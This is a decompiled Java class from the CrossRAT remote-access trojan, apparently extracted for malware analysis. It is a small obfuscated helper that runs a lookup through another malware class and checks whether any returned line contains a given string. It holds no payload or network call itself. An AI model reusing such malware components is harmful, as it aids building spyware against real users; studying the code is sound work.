package a.b;

import crossrat.e;
import java.util.Iterator;
import java.util.List;

public final class a
  extends h
{
  private String[] a;
  private String b;
  
  public a(String[] paramArrayOfString, String paramString)
  {
    this.a = paramArrayOfString;
    this.b = paramString;
  }
  
  public final boolean a()
  {
    try
    {
      Iterator localIterator = (localObject = e.a(this.a)).iterator();
      while (localIterator.hasNext()) {
        if ((localObject = (String)localIterator.next()).toLowerCase().contains(this.b.toLowerCase())) {
          return true;
        }
      }
    }
    catch (Exception localException)
    {
      Object localObject;
      (localObject = localException).printStackTrace();
    }
    return false;
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\a\b\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */